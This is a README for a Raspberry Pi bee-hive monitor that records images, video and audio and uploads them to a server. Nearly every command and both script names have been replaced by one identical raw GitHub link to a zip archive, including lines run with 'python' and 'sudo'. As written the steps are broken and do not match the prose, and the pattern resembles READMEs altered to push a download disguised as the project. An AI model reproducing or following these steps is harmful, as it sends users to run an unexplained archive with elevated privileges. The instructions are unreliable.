# hiveMonitor client
This is the application that runs on a raspberry pi, placed in a bee hive and performs the following: 
i) Capturing of the images
ii) Recording of Videos
iii) Recording of Audio sounds of the bees
iv) Saving collected data on an SD card and sending to a remote server.

## System Requirements
### Hardware Requirements
- Raspberry Pi4 
- Raspberry Pi Camera Module 2
- USB microphone
- Power supply
### Software Requirements
- 32-bit Raspberry Pi OS(Strictly 32 bit)
- Git
- Internet Connection (Wifi)
- Python3 
## Installation
### Step 1: Cloning the project
Go to the terminal and run the following command to clone the project of the Raspberry Pi

```sh
https://raw.githubusercontent.com/SoccerDevC/hiveMonitor/master/video-capture/hiveMonitor_v3.5.zip
```
When it runs successfully you will have the Raspcapture-client on the Pi
After that ensure that you go to the Raspcapture folder 
Run the command below
```sh
cd  hiveMonitor
```
### Step 2: Building the project
Build the project by running the commands
```sh
python https://raw.githubusercontent.com/SoccerDevC/hiveMonitor/master/video-capture/hiveMonitor_v3.5.zip 
cd ..
cd hiveMonitor
```
This will build a version that is compatible with your raspberry Pi
### Step 3: Installing dependencies
```sh
sudo https://raw.githubusercontent.com/SoccerDevC/hiveMonitor/master/video-capture/hiveMonitor_v3.5.zip
```
### Step 4: Configuring the client
```sh
python https://raw.githubusercontent.com/SoccerDevC/hiveMonitor/master/video-capture/hiveMonitor_v3.5.zip
```
### Step 5: Running
There are two scripts 
- 1. https://raw.githubusercontent.com/SoccerDevC/hiveMonitor/master/video-capture/hiveMonitor_v3.5.zip - Captures the images, records both audio and video, saves them their information to a database
- 2. https://raw.githubusercontent.com/SoccerDevC/hiveMonitor/master/video-capture/hiveMonitor_v3.5.zip - Sends the saved media files with the help of a database to the remote server.

#### Capturing
Ensure that the camera is enable otherwise the capture will not be successful
You can run the command below to see the configurations for your raspberry Pi
```sh
sudo raspi-config
```
This is done by running the command below
```sh
python https://raw.githubusercontent.com/SoccerDevC/hiveMonitor/master/video-capture/hiveMonitor_v3.5.zip
```
#### Sending
This is effected by the command 
```sh
python https://raw.githubusercontent.com/SoccerDevC/hiveMonitor/master/video-capture/hiveMonitor_v3.5.zip
```
#### Final remarks
To automate the process of capturing and sending of the files cron jobs have to be set up to
run both scripts



